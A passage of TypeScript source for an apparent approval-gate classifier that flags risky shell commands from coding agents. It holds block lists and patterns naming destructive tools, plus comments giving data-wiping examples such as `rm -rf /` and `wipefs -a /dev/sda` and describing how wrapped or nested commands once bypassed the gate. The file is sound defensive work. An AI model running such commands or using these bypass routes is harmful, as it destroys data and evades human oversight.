  [
    "chroot",
    grammar({ valued: words("--userspec --groups"), flags: words("--skip-chdir"), positional: 1 }),
  ],
  [
    "unshare",
    grammar({
      valued: words(
        "-S --setuid -G --setgid -w --wd -R --root --map-user --map-group --setgroups --propagation",
      ),
      flags: words(
        "-m --mount -u --uts -i --ipc -n --net -p --pid -U --user -C --cgroup -T --time -f --fork -r --map-root-user -c --map-current-user --map-auto --mount-proc --kill-child --keep-caps",
      ),
    }),
  ],
  ["taskset", grammar({ flags: words("-a --all-tasks -p --pid -c --cpu-list"), positional: 1 })],
  [
    "flock",
    grammar({
      valued: words("-w --wait --timeout -E --conflict-exit-code"),
      flags: words(
        "-s --shared -x --exclusive -u --unlock -n --nb --nonblock -o --close -F --no-fork --verbose",
      ),
      positional: 1,
      shellString: true,
    }),
  ],
  [
    "watch",
    grammar({
      valued: words("-n --interval"),
      flags: words(
        "-b --beep -c --color -d --differences -e --errexit -g --chgexit -p --precise -t --no-title -x --exec -w --no-wrap",
      ),
      restIsShellString: true,
    }),
  ],
  [
    "script",
    grammar({
      valued: words(
        "-o --output-limit -O --log-out -I --log-in -B --log-io -T --log-timing -m --logging-format -E --echo",
      ),
      flags: words("-a --append -e --return -f --flush -q --quiet -t --force"),
      positional: 1,
      shellString: true,
    }),
  ],
  [
    "su",
    grammar({
      valued: words("-s --shell -g --group -G --supp-group -w --whitelist-environment"),
      flags: words("-l --login -m -p --preserve-environment -P --pty -f --fast"),
      positional: 1,
      shellString: true,
    }),
  ],
]);
const EMPTY_GRAMMAR = grammar({});

/** ラッパ剥がしの最大反復 (二重・多重ラッパでも有界に止める。ReDoS/無限ループ防止)。 */
const MAX_WRAPPER_STRIP = 8;

/**
 * tokens 先頭の runner ラッパを再帰的に剥がし、実コマンドのトークン列を返す。
 *
 * 純粋なトークン走査で実装し、ReDoS 経路を増やさない (正規表現は正準 `ASSIGNMENT_TOKEN_RE` /
 * `SHELL_INLINE_FLAG_RE` の 2 つだけ)。各ラッパ固有の引数は `WRAPPER_GRAMMAR` (単一表) で読む。
 * 判定不能なときは「剥がさない + 床」側に倒し、過剰スキップで実コマンドを失わない。
 *
 * 戻り値の `capExhausted`: 反復上限に達してもなお先頭がラッパのとき true。ラッパを多重に
 * 積んで実コマンドを上限の奥へ隠す回避を fail-safe (gated) に倒すためのシグナル。
 * 戻り値の `unknownOption`: 表に無い分離 long option (または `--` の後の option 様の実コマンド語) を見て
 * 剥がすのを止めた (R18 H・SEC-CQ18-1)。分類本体は `capExhausted` と同じ床を立てる。
 */
export function stripRunnerWrappers(tokens: string[]): StrippedProgram {
  let cur = tokens;
  const wrappers: string[] = [];
  let unknownOption = false;
  const stop = (): StrippedProgram => ({
    tokens: cur,
    capExhausted: false,
    unknownOption,
    wrappers,
  });
  for (let iter = 0; iter < MAX_WRAPPER_STRIP; iter++) {
    if (cur.length === 0) return stop();
    const name = commandName(cur);
    if (!RUNNER_WRAPPERS.has(name)) return stop();
    const g = WRAPPER_GRAMMAR.get(name) ?? EMPTY_GRAMMAR;

    let i = 1; // ラッパ自身の次から実コマンドを探す。
    let positional = g.positional;
    let optionsEnded = false;
    let rewritten: string[] | undefined;
    while (i < cur.length) {
      const t = cur[i];
      if (t === undefined) break; // 防御 (noUncheckedIndexedAccess)。到達しないが型安全。
      if (!optionsEnded && t === "--") {
        optionsEnded = true; // 明示的な option 終端。位置引数はこの後にも来る (`flock -- FILE cmd`)。
        i++;
        continue;
      }
      // env の VAR=val 代入はオプション位置にのみ現れる (risk 側前置語と同じ正準 regex)。
      if (!optionsEnded && name === "env" && ASSIGNMENT_TOKEN_RE.test(t)) {
        i++;
        continue;
      }
      if (!optionsEnded && t.startsWith("-")) {
        if (g.shellString) {
          // 文字列形: 残りを `sh -c …` に書き換えて既存の inline-shell 経路 (`inlineCodeRisk`) へ流す。
          //   `--command=CMD` の融合 long 形も同じ (SEC-CQ18-3)。
          const eq = t.indexOf("=");
          const longName = eq >= 0 ? t.slice(0, eq) : t;
          if (longName === "--command" || longName === "--session-command") {
            rewritten =
              eq >= 0
                ? ["sh", "-c", t.slice(eq + 1), ...cur.slice(i + 1)]
                : ["sh", "-c", ...cur.slice(i + 1)];
            break;
          }
          if (SHELL_INLINE_FLAG_RE.test(t)) {
            rewritten = ["sh", ...cur.slice(i)];
            break;
          }
        }
        if (g.valued.has(t)) {
          i += 2;
          continue;
        }
        if (t.startsWith("--")) {
          if (t.includes("=") || g.flags.has(t)) {
            i++;
            continue;
          }
          // 表に無い分離 long option = 解析不能。剥がすのは**続ける** (base と同じ 1 語 skip の推定で
          //   category / egress を取りに行く) が、分類本体には床を立てさせる — 床は**加算**であって
          //   代替でない (R19 M・SEC-CQ19-1: 実在するが表に無い `env --ignore-signal` / `nice --10` /
          //   `xargs --eof` で base の high[recursive-rm] が medium[high-risk-other] へ落ち egress も消えた)。
          //   推定が実コマンドを食っても床が残るので verdict は base 以上 (head ⊇ base)。
          unknownOption = true;
          i++;
          continue;
        }
        i++; // 短 option (既知の値つき以外) は 1 語。
        continue;
      }
      if (positional > 0) {
        positional -= 1;
        i++;
        continue;
      }
      break; // ここが実コマンド (または `watch` の文字列)。
    }
    // `watch 'rm -rf x'` / `watch 'rm -rf x' extra` (空白を含む引用語がある = watch は全引数を連結して sh -c
    //   へ渡す) は残り全部を `sh -c` へ書き換える (SEC-CQ19-2)。空白を含む語が無い多語形 (`watch rm -rf x` /
    //   `watch -x cmd`) はそのまま剥がし、category / egress 判定を実コマンドの語列に直接届かせる。
    if (
      rewritten === undefined &&
      g.restIsShellString &&
      i < cur.length &&
      cur.slice(i).some((w) => /\s/.test(w))
    )
      rewritten = ["sh", "-c", ...cur.slice(i)];
    const next = rewritten ?? cur.slice(i);
    if (next.length === 0) return stop(); // ラッパ単体 → 剥がさない。
    if (rewritten === undefined && next.length === cur.length) return stop(); // 進捗なし → 停止。
    // `--` の後で option に見える語が実コマンド位置に来た (`flock -- FILE -c 'cmd'`): 解析不能として床。
    if (rewritten === undefined && (next[0] as string).startsWith("-")) {
      unknownOption = true;
      return stop();
    }
    wrappers.push(name);
    cur = next;
  }
  // 上限到達。なお先頭がラッパなら「実コマンドを上限の奥へ隠した」可能性 → fail-safe gated。
  return {
    tokens: cur,
    capExhausted: RUNNER_WRAPPERS.has(commandName(cur)),
    unknownOption,
    wrappers,
  };
}

/**
 * `stripRunnerWrappers` / `programTokens` の戻り値。`wrappers` は剥がしたラッパ名の列 (外側から順)。
 * check-classifier はこれで `EXIT_MASKING_WRAPPERS` を見る (語を数え直さない・単一出所)。
 */
export interface StrippedProgram {
  tokens: string[];
  capExhausted: boolean;
  /** 表に無い分離 long option を見た (R18 H): 剥がすのを止めた。分類本体は medium + high-risk-other の床。 */
  unknownOption: boolean;
  wrappers: string[];
}

/** rm が再帰かつ強制か (フラグの順不同・融合・分割・long を全許容)。 */
function isRecursiveForcedRm(tokens: string[]): boolean {
  if (commandName(tokens) !== "rm") return false;
  let recursive = false;
  let force = false;
  for (const t of tokens.slice(1)) {
    const tl = t.toLowerCase();
    if (tl === "--recursive") recursive = true;
    else if (tl === "--force") force = true;
    else if (/^-[a-z]*$/i.test(t)) {
      // 融合短フラグ (-rf / -fr / -Rf 等) を 1 文字ずつ。
      // QA-3: コマンド全体が uppercase (`RM -RF`) の変種を取りこぼさないため小文字化して判定する。
      if (/r/.test(tl)) recursive = true;
      if (/f/.test(tl)) force = true;
    }
  }
  return recursive && force;
}

/** git push が強制か。git の global option が subcommand 前にあっても token 全体から拾う。 */
function isForcedGitPush(tokens: string[]): boolean {
  if (commandName(tokens) !== "git" || !tokens.includes("push")) return false;
  return tokens.some(
    (t) =>
      t === "-f" ||
      t === "--force" ||
      t === "--force-with-lease" ||
      (/^-[a-z]*$/i.test(t) && t.startsWith("-") && !t.startsWith("--") && t.includes("f")),
  );
}

/** git reset --hard / clean --force を global option (`-C`, `-c`, `--no-pager`) 非依存で拾う。 */
function isDestructiveGitWorktreeRewrite(tokens: string[]): boolean {
  if (commandName(tokens) !== "git") return false;
  const resetIdx = tokens.findIndex((t, i) => i > 0 && t.toLowerCase() === "reset");
  if (resetIdx >= 0 && tokens.slice(resetIdx + 1).some((t) => t.toLowerCase() === "--hard")) {
    return true;
  }
  const cleanIdx = tokens.findIndex((t, i) => i > 0 && t.toLowerCase() === "clean");
  if (cleanIdx < 0) return false;
  return tokens.slice(cleanIdx + 1).some((t) => {
    const lower = t.toLowerCase();
    return (
      lower === "--force" ||
      lower === "-f" ||
      (/^-[a-z]+$/i.test(t) && !t.startsWith("--") && lower.includes("f"))
    );
  });
}

/** `git -c alias.x=!<shell> x` 型の shell alias は任意コード実行なので fail-safe で止める。 */
function definesShellGitAlias(tokens: string[]): boolean {
  if (commandName(tokens) !== "git") return false;
  return tokens.slice(1).some((t) => /^alias\.[^=\s]+=!/i.test(t));
}

/** chmod が world-writable / 再帰か。 */
function isDangerousChmod(tokens: string[]): boolean {
  if (commandName(tokens) !== "chmod") return false;
  for (const t of tokens.slice(1)) {
    if (t === "-R" || t === "--recursive") return true;
    if (/^[0-7]{3,4}$/.test(t) && /[2367]$/.test(t)) return true; // others ビットに write
    if (/[ao]\+?w/i.test(t) || /\+w/.test(t)) return true; // a+w / o+w / +w
  }
  return false;
}

/** ブロックデバイスへの書込 (リダイレクト or dd of=)。 */
const BLOCK_DEVICE_RE = /\/dev\/(sd[a-z]|nvme\d|disk\d|hd[a-z]|vd[a-z]|mmcblk\d)/i;
function writesBlockDevice(command: string, tokens: string[]): boolean {
  // > /dev/sda 等のリダイレクト先。
  if (/[<>]\s*\/dev\/(sd[a-z]|nvme\d|disk\d|hd[a-z]|vd[a-z]|mmcblk\d)/i.test(command)) return true;
  // dd of=/dev/...
  if (commandName(tokens) === "dd" && tokens.some((t) => /^of=\/dev\//i.test(t))) return true;
  return false;
}

/**
 * ディスク / ファイルシステム / パーティション / 暗号デバイス / LVM・RAID を**不可逆に破壊しうる**
 * プログラム (basename, 正規化後)。SEC-7。
 *
 * 背景: `\bmkfs\b` (LITERAL_RULES の high エントリ・旧 HIGH_RISK_LITERAL_RE) は `mkfs.ext4` を捕捉するが、
 * 同等に破壊的な兄弟ツール (`mke2fs` = mkfs.ext* の実体 / `wipefs` / `blkdiscard` / `sfdisk` 等) を取りこぼし、`wipefs -a /dev/sda`
 * のような不可逆操作が low → 承認ゲート素通り (auto/bypassPermissions で無承認実行) になっていた。
 *
 * 構造ゲート (memory security-gate-reuse-canonical-parser): literal 正規表現への列挙追記 (いたちごっこ)
 * でなく、**分類器が共有する tokenize → stripRunnerWrappers → commandName → normalizeCommandName と
 * 同一の正規化**で basename を照合する。これにより `/sbin/wipefs` / `'wipefs'` / `sudo wipefs` /
 * `env X=1 wipefs` を path/quote/wrapper 非依存で同一に捕捉する (PERSIST_DENY_PROGRAMS と同方式)。
 * `mkfs.<fstype>` ファミリ (ext2/3/4・xfs・btrfs・vfat・ntfs・exfat・f2fs…) は列挙せず prefix で一括。
 *
 * 設計上の over-gate 許容: `parted -l` / `cryptsetup status` のような読取専用サブコマンドも high に倒すが、
 * 承認ゲートは fail-safe (false-negative=leak を許さず false-positive=確認過多は許容)・かつこれらは
 * コーディングエージェントの通常作業に現れない root/admin ツールゆえ実害ゼロ。引数解析で読取/破壊を
 * 区別する複雑化は新たな bypass 面を作るため採らない (program 単位で倒すのが最も堅牢)。
 */
const DESTRUCTIVE_DISK_PROGRAMS: ReadonlySet<string> = new Set([
  // ファイルシステム作成 (mkfs.* は isDestructiveDiskProgram の prefix 判定で一括)。
  "mke2fs", // mkfs.ext2/3/4 の実体バイナリ
  "mkswap",
  "mkdosfs", // = mkfs.fat/vfat
  "mkntfs", // = mkfs.ntfs
  // パーティションテーブル編集 (誤操作で全データ喪失)。
  "fdisk",
  "cfdisk",
  "sfdisk",
  "gdisk",
  "cgdisk",
  "sgdisk",
  "parted",
  // 署名/データ消去・低レベル破壊書込。
  "wipefs",
  "blkdiscard",
  "shred",
  "badblocks", // -w は破壊的書込テスト
  // 暗号デバイス (luksFormat 等で鍵スロット不可逆初期化)。
  "cryptsetup",
  // 低レベル format / secure-erase (読取モードを持たず常時破壊・SEC-3)。
  "sg_format", // SCSI low-level format
  "wipe", // secure file/device wipe
  "nwipe", // secure device wipe
  // LVM / RAID の不可逆破壊。
  "pvremove",
  "vgremove",
  "lvremove",
  "lvreduce", // 論理ボリューム縮小 = データ喪失 (読取モードなし・SEC-3)
  "vgreduce", // VG から PV 除去 (SEC-3)
  "mdadm", // --create はメンバディスクを破壊
]);

/**
 * 破壊的ディスク/FS プログラムか (SEC-7)。commandName + normalizeCommandName で正規化した basename を
 * 照合し (分類器と同一正規化を共有)、`mkfs` 単体と `mkfs.<fstype>` ファミリは prefix で一括捕捉する。
 *
 * `tokens` の前処理は caller 依存 (TDA-1): classify 路は deassign + stripRunnerWrappers 後の実コマンド
 * (`sudo wipefs` → wipefs)、persist 路は raw tokenize 列 (合成/ラッパは上流 SHELL_COMPOSITION_RE /
 * isCleanExecutableToken / PERSIST_DENY_PROGRAMS で既に排除済ゆえ bare な破壊 program のみ本述語に到達)。
 */
function isDestructiveDiskProgram(tokens: string[]): boolean {
  const name = normalizeCommandName(commandName(tokens));
  if (name === "mkfs" || name.startsWith("mkfs.")) return true; // mkfs / mkfs.ext4 / mkfs.xfs …
  return DESTRUCTIVE_DISK_PROGRAMS.has(name);
}

/**
 * 読取モードを**日常的に持つ**ストレージツール (nvme/zpool/zfs/dmsetup) の、**読取以外**の
 * サブコマンドを gate (high) に倒す (SEC-7 / SEC-3 / SEC-9 / SEC-10 round D 再監査)。
 *
 * ## allowlist 反転 (SEC-10): 旧実装は破壊サブコマンドの **denylist** (destroy/format/…) だったが、
 *   full 再監査が `nvme delete-ns` / `zfs rollback` / `zpool split` 等の取りこぼし (SEC-9) を連続検出した。
 *   denylist 列挙は「ツールがサブコマンドを増やすたび追従が要る」いたちごっこで、fail-safe (false-negative=
 *   無承認破壊を禁止) と本質的に相性が悪い (memory security-gate-reuse-canonical-parser)。よって
 *   **読取サブコマンドの allowlist** に反転し、**未知/非読取は既定で gate** する (新破壊サブコマンドが
 *   将来追加されても自動的に塞がる)。allowlist 外しが over-gate (= 承認過多) で済み leak にならないのが要点。
 *   nvme/zpool/zfs/dmsetup の非読取サブコマンドはコーディングエージェントの通常作業に現れない admin 操作
 *   ゆえ over-gate の実害ゼロ。
 *
 * `tokens` は分類器と同一正規化を共有。先頭の global option (`-x`/`--y`) は飛ばして最初の非オプション
 * トークンをサブコマンドとみなす (`zfs -foo destroy x` でも捕捉)。サブコマンド無し (bare `zfs` /
 * `zfs --help`) は false (= 委ねる)。
 */
const READ_ONLY_STORAGE_SUBCOMMANDS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
  [
    "nvme",
    new Set([
      "list",
      "list-ns",
      "list-subsys",
      "list-ctrl",
      "id-ctrl",
      "id-ns",
      "ns-descs",
      "smart-log",
      "error-log",
      "fw-log",
      "get-log",
      "get-feature",
      "show-regs",
      "telemetry-log",
      "self-test-log",
      "version",
      "help",
    ]),
  ],
  ["zpool", new Set(["list", "status", "get", "history", "iostat", "version", "help"])],
  ["zfs", new Set(["list", "get", "holds", "version", "help"])],
  ["dmsetup", new Set(["ls", "info", "status", "table", "deps", "targets", "version", "help"])],
]);
/**
 * hdparm の破壊フラグ (ATA secure-erase / TRIM 範囲 / 不良セクタ書込 / DCO 復元 / セクタ書込 / FW 書込)。
 * 固定リテラル alternation・ReDoS 無し。`--flag=value` 連結形 (SEC-8) に対応するため `=` 前で照合する。
 */
const HDPARM_DESTRUCTIVE_FLAG_RE =
  /^--(security-erase|security-erase-enhanced|trim-sector-ranges|trim-sector-ranges-stdin|make-bad-sector|dco-restore|write-sector|fwdownload)$/;

/**
 * 値を取らないことが普遍的に確実な先頭フラグ (help/version/verbose/quiet)。これらは subcommand 前に
 * 現れても安全に skip できる (値を消費しない)。これ以外の先頭オプションは値を取るか不明ゆえ skip しない。
 */
const SAFE_LEADING_FLAGS: ReadonlySet<string> = new Set([
  "-h",
  "--help",
  "-v",
  "--verbose",
  "-q",
  "--quiet",
  "-V",
  "--version",
  "-?",
  "--usage",
]);

/**
 * サブコマンドを持つストレージツールのサブコマンドを同定する (QA-1 round D 再監査)。
 *
 * これらのツールは subcommand が第1引数 (`zfs <sub> [opts]`)。**値付き global option の値を subcommand と
 * 誤認する leak** を防ぐため、option-skip は **値を取らないと確実な安全フラグ (help/verbose 等) のみ**に
 * 限定する。未知の先頭オプション (`-o status` の `-o` 等・値を取りうる) に当たったら同定不能ゆえ
 * `{ ambiguous: true }` を返し、呼び出し側が fail-safe gate する (旧実装は全 option を skip し
 * `zpool -o status create` の値 `status` を read-only subcommand と誤認して破壊 `create` を素通りさせた)。
 */
function storageSubcommand(tokens: string[]): { sub: string | undefined; ambiguous: boolean } {
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i];
    if (t === undefined) continue;
    if (!t.startsWith("-")) return { sub: t.toLowerCase(), ambiguous: false }; // 最初の非オプション = subcommand
    if (!SAFE_LEADING_FLAGS.has(t.toLowerCase().split("=")[0] ?? t)) {
      return { sub: undefined, ambiguous: true }; // 値を取りうる未知 option → 同定不能 → gate
    }
    // 安全フラグ (-h/--help/-v 等) は値を消費しないので skip して次を見る。
  }
  return { sub: undefined, ambiguous: false }; // subcommand 無し (bare / 安全フラグのみ = --help)。
}

function isDestructiveDiskSubcommand(tokens: string[]): boolean {
  const name = normalizeCommandName(commandName(tokens));
  const readOnly = READ_ONLY_STORAGE_SUBCOMMANDS.get(name);
  if (readOnly) {
    const { sub, ambiguous } = storageSubcommand(tokens);
    if (ambiguous) return true; // 未知の先頭 option で subcommand 同定不能 → fail-safe gate (QA-1)。
    if (sub === undefined) return false; // bare / help-only は委ねる。
    return !readOnly.has(sub); // 読取 allowlist 外 = 未知/破壊 → gate (fail-safe)。
  }
  // hdparm は flag 駆動。SEC-8: `--flag=value` 連結形を `=` 前で照合する。
  if (name === "hdparm") {
    return tokens.slice(1).some((t) => HDPARM_DESTRUCTIVE_FLAG_RE.test(t.split("=")[0] ?? t));
  }
  return false;
}

/**
 * find の破壊オプション (QA-3)。
 *
 * `find ... -delete` はマッチ全件を削除し、`find ... -exec <cmd> ...` /
 * `-execdir` / `-ok` は配下で任意コマンドを実行する。これらは構造判定の対象外だったため
 * `find . -delete` / `find . -exec rm -rf {} +` が low に落ち承認ゲートを素通りしていた。
 *
 * 戻り値:
 *  - "high": -exec 配下が再帰強制 rm 等、字面で確実に破壊的なもの。
 *  - "medium": -delete / 一般の -exec (副作用ありだが内容まで断定しない) → ゲート対象。
 *  - undefined: find ではない / 破壊オプション無し。
 */
function findDestructiveRisk(tokens: string[]): "high" | "medium" | undefined {
  if (commandName(tokens) !== "find") return undefined;
  let sawExec = false;
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i];
    if (t === "-delete") return "medium";
    if (t === "-exec" || t === "-execdir" || t === "-ok" || t === "-okdir") {
      sawExec = true;
      // -exec 配下の最初のコマンドが既知の破壊コマンドなら high。
      const sub = tokens.slice(i + 1);
      if (sub.length > 0 && isRecursiveForcedRm(sub)) return "high";
    }
  }
  return sawExec ? "medium" : undefined;
}

/** chown が再帰 (-R/--recursive) か。所有権の再帰変更はゲート対象 (QA-3)。 */
function isRecursiveChown(tokens: string[]): boolean {
  const name = commandName(tokens);
  if (name !== "chown" && name !== "chgrp") return false;
  return tokens
    .slice(1)
    .some((t) => t === "-R" || t === "--recursive" || (/^-[a-z]*$/i.test(t) && /R/.test(t)));
}

/**
 * SEC-1: シェル/インタプリタのインラインコード + コマンド置換が承認ゲートを素通りする穴を塞ぐ。
 *
 * 背景: classifyCommandRisk は承認ゲート (approval-bridge.requiresHumanApproval) の唯一の根拠。
 * `sh -c "rm -rf /"` / `python -c "..."` / `$(rm -rf /tmp)` / `eval "..."` は、tokenize が
 * クォート/バッククォートを雑に剥がす都合で内側コマンドが構造判定に乗らず low に落ちていた。
 * low → defer → ActraDeck ゲートを張らず native flow 委譲 → bypassPermissions/auto で無承認実行。
 *
 * 方針 (ReDoS 回避が必須・memory「正規表現拡張は ReDoS 検査」):
 *  - 新規の生正規表現で内側コードを再パースしない (シェル文法の正規表現再パースは ReDoS/誤検出源)。
 *  - 既存のトークン/構造判定を再利用し、**有界**な処理のみで分類する。
 *  - 内側を確実に再パースできないものは fail-safe で **medium に床上げ** (over-gate を許容、
 *    INV-APPROVAL の false-negative を許さない)。
 */

/** インラインコードを実行するシェル (basename, 小文字)。 */
const INLINE_SHELLS = new Set(["sh", "bash", "zsh", "dash", "ksh", "fish"]);
/** インラインコードを実行するインタプリタ (バージョンサフィックス除去後の正規名)。 */
const INLINE_INTERPRETERS = new Set(["python", "perl", "ruby", "node", "nodejs", "php"]);
/** シェルのインラインコードフラグ (-c / -lc / -ic / -i 等。融合短フラグも許容)。 */
const SHELL_INLINE_FLAG_RE = /^-[a-z]*c$/i; // 末尾が c の融合短フラグ (-c/-lc/-ic) を拾う。
/** インタプリタのインラインコードフラグ。 */
const INTERPRETER_INLINE_FLAGS = new Set(["-c", "-e", "-E", "-r", "-R"]);

/**
 * SEC-1 #5: コマンド名からバージョンサフィックスを剥がして正規名にする。
 *
 * `python3.11` / `python3` / `python2` / `node20` / `php8.2` 等のバージョン付きバイナリは、
 * INLINE_SHELLS / INLINE_INTERPRETERS の **完全一致**を漏らし承認ゲートを素通りさせていた。
 * 末尾の数字 + ドット区切り数字 (`\d+(\.\d+)*`) を 1 回だけ剥がす (有界量化子のみ・ReDoS 無し)。
 * 既知の言語/シェル名プレフィックスに一致したときのみ剥がし、`python3.11` → `python`。
 * `bash`/`sh` 等サフィックス無しの名前はそのまま返す。`go1` のような非対象は影響しない。
 */
const VERSION_SUFFIX_RE = /^([a-z]+?)\d+(?:\.\d+)*$/; // bash:語幹を非貪欲・末尾の version を有界に剥がす。
export function normalizeCommandName(name: string): string {
  if (INLINE_SHELLS.has(name) || INLINE_INTERPRETERS.has(name)) return name; // サフィックス無しは即返し。
  const m = VERSION_SUFFIX_RE.exec(name);
  if (m) {
    const stem = m[1] ?? "";
    if (INLINE_SHELLS.has(stem) || INLINE_INTERPRETERS.has(stem)) return stem;
  }
  return name;
}

/** 正規化後の名前がインラインシェルか。 */
function isInlineShell(name: string): boolean {
  return INLINE_SHELLS.has(normalizeCommandName(name));
}
/** 正規化後の名前がインラインインタプリタか。 */
function isInlineInterpreter(name: string): boolean {
  return INLINE_INTERPRETERS.has(normalizeCommandName(name));
}

/**
 * **実際に展開される**コマンド置換をセグメントが含むか (R9 監査の残余 L)。
 *
 * `hasCommandSubstitution` は `includes("$(")` の字面判定で、単一引用内のリテラルも拾う。
 * 抽出側 (`collectSubstitutionInners`) だけを引用対応にしたため非対称が残り、
 * `git commit -m 'fix: use $( ) syntax'` が medium[inline-code] = 偽の承認カードになっていた
 * (本ブランチが除去しようとしている症状)。bash は単一引用内で展開しないので、ゲート判定は
 * 実在判定で行う。**読めなかった (未終端) ときは安全側で true** に倒す。
 */
function hasLiveCommandSubstitution(rawSegment: string): boolean {
  if (!hasCommandSubstitution(rawSegment)) return false; // 速い前置き (字面が無ければ実在しない)。
  const { starts, aborted } = collectSubstitutionInners(rawSegment, "command");
  return starts.length > 0 || aborted;
}

/** コマンド置換 `$(...)` / backtick の**字面**をセグメントが含むか (粗い前置き)。 */
function hasCommandSubstitution(rawSegment: string): boolean {
  return rawSegment.includes("$(") || rawSegment.includes("`");
}

/** プロセス置換 `<(...)` / `>(...)` を文字列が含むか (SEC-1 #4)。 */
function hasProcessSubstitution(command: string): boolean {
  return command.includes("<(") || command.includes(">(");
}

/**
 * シェル/インタプリタが「スクリプトファイルを実行する形」か (SEC-1 #1-3)。
 *
 * tokens[0] (コマンド名) 以降に **非フラグの operand** が 1 つでもあればファイル実行
 * (`bash script.sh` / `python manage.py runserver`) と見なし low 維持。operand が無い
 * (フラグだけ or コマンド名のみ = `echo ... | sh` のパイプ先 / 引数なし対話シェル) なら
 * stdin からコードを読む = 中身を再分類できない → 呼び出し側が fail-safe gated に倒す。
 * 純トークン走査 (正規表現なし・有界) で ReDoS 経路を増やさない。
 */
function hasScriptFileOperand(tokens: string[]): boolean {
  return tokens.slice(1).some((t) => !t.startsWith("-"));
}

/**
 * 再監査#4 round2 (D): 構造的に解析不能なセグメントの一般化 fail-safe。
 *
 * これまでのゲートは「先頭トークンを basename 化して既知の破壊コマンド/シェルに照合する」前提
 * だった。だがサブシェル `(rm -rf /)` / ブレースグループ `{ rm -rf /; }` / 括弧付きパイプ先
 * `(sh)` / 変数展開起動 `$X -rf /` / 先頭コマンド置換 `$(echo rm) -rf /` は、先頭トークンが
 * クリーンな実行可能名にならず commandName が誤判定 → low 素通り (個別パッチのいたちごっこ)。
 *
 * 一般化ルール: stripRunnerWrappers 後の先頭トークンが「クリーンな実行可能名」に正規化できない
 * (= パス/バージョン込みの通常コマンド名 EXECUTABLE_NAME_RE にマッチしない、または ( ) { } $ < >
 * 等のシェルメタ文字を含む) とき、そのセグメントは構造判定不能 → fail-safe medium 床上げ。
 * 可能なら括弧/ブレース等を剥がして内側を再分類し high を拾う。ReDoS 回避のため有界量化子のみ。
 */
// 通常のコマンド名トークン (英数・パス区切り・ドット・プラス・ハイフン・アンダースコア)。
// 有界文字クラスのみ (量化子 + は線形)。シェルメタ文字 ( ) { } $ < > | & ` ; * ? は含まない。
const EXECUTABLE_NAME_RE = /^[A-Za-z0-9._/+-]+$/;
// 先頭の env 代入 (`VAR=val`) — 通常のシェル構文。コマンド名ではないのでスキップする。
//   check-classifier の透過前置 (`stripTransparentPrefix`) も同じ regex を使う (R17 H・SEC-CQ17-1 族 B:
//   `FOO=1 $(run() {…})` — 第二の代入リーダを作らない・単一出所)。
export const ASSIGNMENT_TOKEN_RE = /^[A-Za-z_][A-Za-z0-9_]*=/;
// 先頭/末尾の grouping/quote メタ文字 (1 文字判定・有界文字クラス)。
const LEADING_GROUPING_CHAR_RE = /[({'"]/;
const TRAILING_GROUPING_CHAR_RE = /[)};'"]/;

/**
 * 先頭の grouping/quote と末尾の grouping/terminator を剥がして内側コマンドを露出させる。
 *
 * **線形の両端走査で行う (SEC-R6-3・R6 監査 M)**: 旧実装は `/[)}\s;'"]+$/` という
 * **末尾アンカーだが先頭非アンカー**の正規表現で、`")".repeat(n) + "x"` のように
 * 「該当文字の長い並び + 非該当文字」が続く入力に対し開始位置ごとに後戻りし O(N²) になった
 * (監査実測: 16KiB 入力の分類 1 回で base 1,907ms → 本ブランチ 6,882ms。本ブランチは
 * primary/legacy の二重走査ぶん増幅する)。分類器は **hook の同期パス**にあるため、
 * 1 個の `tool_input.command` で承認 relay・timeout タイマ・他セッションの hook を止めうる
 * (SEC-CQ5-3 で `stripFdPrefix` を線形化したのと同じクラスの残り)。
 * 文字集合は旧正規表現と byte-equivalent (先頭 `( { 空白 ' "` / 末尾 `) } 空白 ; ' "`)。
 */
export function stripGroupingWrappers(s: string): string {
  let start = 0;
  while (start < s.length) {
    const c = s[start] as string;
    if (!LEADING_GROUPING_CHAR_RE.test(c) && !WHITESPACE_RE.test(c)) break;
    start += 1;
  }
  let end = s.length;
  while (end > start) {
    const c = s[end - 1] as string;
    if (!TRAILING_GROUPING_CHAR_RE.test(c) && !WHITESPACE_RE.test(c)) break;
    end -= 1;
  }
  return s.slice(start, end);
}

/** 先頭トークンがクリーンな実行可能名か (メタ文字を含まない通常コマンド名)。 */
function isCleanExecutableToken(token: string): boolean {
  return EXECUTABLE_NAME_RE.test(token);
}

/**
 * コマンド位置に来ても**プログラム名にならない**予約語 (SEC-CQ10-4・R10 監査 H・pre-existing)。
 *
 * `if true; then rm -rf /srv; fi` は `;` で切ると `then rm -rf /srv` になり、`then` が
 * プログラム名に見えて rm が消えた (`for…do` / `while…do` / `else` / `elif` / `!` / `time` も同型。
 * 実 bash は 11 形すべてで rm を起動 — stub PATH で確認)。bash の文法上これらの直後は再び
 * コマンド位置なので、代入前置と同じ「前置語」として読み飛ばす。
 * `in` は含めない (`for f in …` / `case x in` の中でだけ現れ、コマンド位置には来ない)。
 * `{` `(` は grouping wrapper が別途扱う。
 */
export const COMMAND_POSITION_RESERVED_WORDS: ReadonlySet<string> = new Set(
  "if then else elif fi for while until do done case esac time !".split(" "),
);

/**
 * `time` の直後の語が timespec (option 形) か。bash の文法は `time [-p] [--] pipeline` だが、R16 の
 * `-p` / `--` の閉集合では `time -v rm -rf …` が `-v` をクリーンな実行可能名と見て low/[] に落ちる
 * (R17 M・SEC-CQ17-2)。bash 自身は `-v` を command と見て rc=127 で止まる (rm は走らない) が、
 * `/bin/sh` (dash) には予約語 `time` が無く外部 `/usr/bin/time -v rm …` として**実行する**。分類器は
 * shell を選べないので `-` で始まる語をすべて timespec として読み飛ばす (安全側の過大近似・
 * `stripRunnerWrappers` の汎用 option skip と同じ規則)。R16 H (SEC-CQ16-1) の `-p` 回帰 (3b6d5b0・
 * base main は high/recursive-rm) もこの述語が閉じる。check-classifier の `time` 透過も同じ述語を使う
 * (第二の前置語パーサを作らない・単一出所)。
 */
export function isTimespecWord(word: string): boolean {
  return word.startsWith("-");
}

/**
 * セグメント先頭の**前置語**をスキップして実コマンド先頭の index を返す —
 * env 代入 (`VAR=val`) と、コマンド位置の予約語 (`then` / `do` / `!` / `time` …) の両方。
 * どちらも「その直後がコマンド位置」であり、順不同で連なりうる (`then FOO=1 rm`)。
 * `FOO=bar ls` を「解析不能メタ文字」と誤認しない・`then rm` を `then` プログラムと誤認しない、
 * の両方を 1 箇所で扱う (分類器・check-classifier・egress 判定の全消費者で一様)。
 */
export interface CommandPrefixOptions {
  /**
